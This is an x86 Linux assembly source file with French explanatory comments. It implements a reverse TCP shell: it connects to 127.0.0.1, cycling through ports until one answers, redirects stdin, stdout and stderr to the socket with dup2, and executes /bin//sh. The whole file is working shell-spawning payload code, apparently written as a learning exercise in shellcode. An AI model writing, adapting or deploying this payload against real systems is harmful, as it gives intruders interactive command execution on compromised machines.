section .data 
    fail db "Port failure, retrying another port", 0xa
    len_fail equ $-fail

    end_fail db "Port test failed. Shutting down.."
    len_end equ $-end_fail
    
section .text
    global _start

_start: 

       
    mov	eax, 0x66  ;numéro syscall de socketcall pour la création d'une socket 
    mov ebx, 0x1   ;SYS_SOCKET =1 argument de la fonction pour la créaction d'une socket 
                   ;socket(AF_INET, SOCK_STREAM, 0)
    xor  edx, edx  ; edx := 0
    push edx       ; 0 protocol : pour déclarer le protocol utilisé IPProtocol 
    push ebx       ; 1 type: SOCK_STREAM = 1type de socket, ici pour déclarer une socket TCP (on utilise SOCK_DGRAM pour l'UDP)
    push 0x2       ; 2 socket_family AF_INET =2 pour les adresses iPv4
    mov  ecx, esp  ; on met le stack pointeur pour faire pointer sur les arguments de la fonction 

    int 0x80       ; execute la fonction, retourne le filedescriptor de la socket dans eax

    mov edi, eax   ; sauvegarder le socket filedescriptor dans edi pour les prochains usages 

                     ; connect(s, (struct sockaddr *)&sa, sizeof(sa))

                     ; d'abord on crée la structure de données pour définir l'adresse la socket 

                     ;struct sockaddr_in {
                     ;  __kernel_sa_family_t  sin_family;     //Famille d'adresses (IPv4 pour notre cas)
                     ;  __be16                sin_port;       // numéro de port 
                     ;  struct in_addr        sin_addr;       // adresse IP
                     ;};
                     

    mov si, 0x03d9   ; on garde dans si le numéro du premier port qu'on va essayer de contacter que l'on incrémentera au fur et à mesure  
socket_construct:

    push 0x0101017f  ; adresse ip de bouclage interne 127.0.0.1 dans le sens inversé (network byte order)
    push si          ; le numéro de port, qui se incrémenté automatiquement en cas de failure
    push word 0x2    ; 2 AF_INET syscall pour les adresses IPv4 
    mov  ecx, esp    ; on fait pointer ecx sur la structure de données 

                    ; on push sur la stack les paramètres de la fonction socketcall pour la connexion cette fois !
    push 0x10       ; taille de la structure 10 bytes
    push ecx        ; pointeur sur la structure de données
    push edi        ; le socket filedescriptor stocké précédemment 
    mov  ecx, esp   ; on fait pointer le tout ! 
    
    mov al, 0x66    ; pour SYSCALL_SOCKETCALL 0x66
    mov bl, 0x3     ; SYS_CONNECT = 0x3 c'est l'arguement pour la connexion(where 0x1 = SYS_SOCKETpour créer, et 0x2 pour SYS_BIND )
    int 0x80        ; on execute

    cmp eax, 0      ; si la connexion aboutit, alors la fonction retourne 0, sinon on jump vers la fonction d'incrémentation du numéro de port
    jne error_print



                    ; I/O Redirection : permet la redrection des sorties std :stdin = 0, stdout = 1 and stderr = 2 
                    
    pop ebx		    ; on récupère le file descriptor qui est au sommet de la stack suite à l'execution de la fonction de connexion
	xor eax, eax	
	xor ecx, ecx    
	mov cl, 0x2     ; compteur pour boucler 3 fois 

    

ioloop:     
    mov al, 0x3F    ; SYS_DUP2 sycall
    int 0x80        ; on execute
    dec ecx         ; on décrémente le compteur (et paramètre pour la std)
    jns ioloop


    

                    ;; on fait appel à bash avec execve
    

    xor	 ebx, ebx	
    xor  edx, edx 
    push edx		
    push 0x68732f2f	;String "hs//"
    push 0x6e69622f	;String "nib/"  
    
    mov	 ebx, esp
    mov	 ecx, edx	    
    
    mov	 al, 0x0B	;syscall: sys_execve
    int 0x80

end: 
    mov eax, 1      
    mov ebx, 1
    int 80h         ; syscall exit(0)


fail_end:           ;print le messages d'erreurs après trop d'essais :(
    mov eax,4
    mov ebx,1
    mov ecx, end_fail
    mov edx, len_end
    int 0X80


    mov eax, 1      
    mov ebx, 1
    int 80h         ; syscall exit(0)

error_print:        ;print le message d'erreurs de port ensuite incrémente le numéro de port
    
    mov eax,4
    mov ebx,1
    mov ecx, fail
    mov edx, len_fail
    int 0X80

    add si, 0x0100 ; incrémente de 1 le numéro de port : OX0100 à cause du network byte order 

    cmp si, 0xffd9 ; limite d'essais
    je fail_end
    
    jmp socket_construct  ;jump à la construction de la structure de données 


